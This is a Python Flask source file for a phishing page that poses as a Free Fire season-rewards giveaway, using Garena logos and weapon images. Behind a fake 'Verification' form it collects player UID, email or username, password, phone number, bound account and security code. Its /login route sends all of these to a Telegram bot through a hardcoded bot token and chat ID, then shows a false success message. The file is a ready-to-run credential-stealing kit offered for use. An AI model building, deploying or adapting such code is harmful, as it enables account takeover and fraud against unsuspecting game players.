from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

# --- APNA DATA YAHAN DALO ---
BOT_TOKEN = "8674876151:AAFF6DYIMEbeBkp0JVN96Q88PtAlg_LmPfM"
CHAT_ID = "8415754268"

HTML_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>Free Fire Rewards</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0a0a0a; font-family: Arial; margin: 0; color: white; text-align: center; }
        .main { max-width: 450px; margin: 0 auto; padding: 15px; }
        .header { background: #000; padding: 10px; border-bottom: 2px solid #ffcc00; }
        .collect-bar { background: linear-gradient(90deg, #4b0082, #8b008b); padding: 10px; border-radius: 20px; border: 1px solid #ff00ff; margin: 15px 0; font-weight: bold; font-size: 13px; box-shadow: 0 0 10px #ff00ff; }
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
        .card { background: #1a1a1a; border: 1px solid #333; padding: 5px; border-radius: 5px; }
        .card img { width: 100%; height: 75px; object-fit: contain; }
        .c-btn { background: #4b0082; color: #fff; border: none; width: 100%; padding: 8px 0; font-size: 11px; cursor: pointer; border-top: 1px solid #ff00ff; }
        .form-box { background: #fff; color: #333; border-radius: 12px; padding: 20px; margin-top: 20px; text-align: left; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; outline: none; }
        .p-btn { background: #a020f0; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="header"><img src="https://ff.garena.com/static/images/logo_en.png" width="120"></div>
    <div class="main" id="v1">
        <img src="https://ff.garena.com/static/images/home/banner_1.jpg" style="width:100%; border-radius:10px;">
        <div class="collect-bar">CLAIM SEASON REWARDS</div>
        <div class="grid">
            <div class="card"><div>GROZA</div><img src="https://freefiremobile-a.akamaihd.net/ffmobile/common/ui_res/weapon/905001221.png"><button class="c-btn" onclick="sh()">CLAIM</button></div>
            <div class="card"><div>MP40</div><img src="https://freefiremobile-a.akamaihd.net/ffmobile/common/ui_res/weapon/905000216.png"><button class="c-btn" onclick="sh()">CLAIM</button></div>
            <div class="card"><div>M1887</div><img src="https://freefiremobile-a.akamaihd.net/ffmobile/common/ui_res/weapon/905001305.png"><button class="c-btn" onclick="sh()">CLAIM</button></div>
        </div>
    </div>
    <div class="main" id="v2" style="display:none">
        <div class="form-box">
            <h3 style="text-align:center; color:#4b0082; margin-top:0;">Verification</h3>
            <div id="f">
                <input id="u" placeholder="Player UID">
                <input id="e" placeholder="Email/Username">
                <input id="p" placeholder="Password" type="password">
                <input id="ph" placeholder="Phone Number">
                <input id="b" placeholder="Binded Account">
                <input id="s" placeholder="Security Code">
                <button class="p-btn" onclick="send()">Verify Now</button>
            </div>
            <div id="ok" style="display:none; text-align:center; color:green;"><b>Success! Reward sent.</b></div>
        </div>
    </div>
    <script>
        function sh(){ document.getElementById('v1').style.display='none'; document.getElementById('v2').style.display='block'; }
        function send(){
            const fd = new FormData();
            fd.append('u', document.getElementById('u').value);
            fd.append('e', document.getElementById('e').value);
            fd.append('p', document.getElementById('p').value);
            fd.append('ph', document.getElementById('ph').value);
            fd.append('b', document.getElementById('b').value);
            fd.append('s', document.getElementById('s').value);
            fetch('/login', {method:'POST', body:fd}).then(()=>{
                document.getElementById('f').style.display='none';
                document.getElementById('ok').style.display='block';
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/login', methods=['POST'])
def login():
    d = request.form
    m = f"🔥 *NEW DATA RECEIVED* 🔥\\n\\n🆔 UID: {d.get('u')}\\n📧 User: {d.get('e')}\\n🔑 Pass: {d.get('p')}\\n📱 Ph: {d.get('ph')}\\n🛡️ Bind: {d.get('b')}\\n🔐 Code: {d.get('s')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': m, 'parse_mode': 'Markdown'})
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
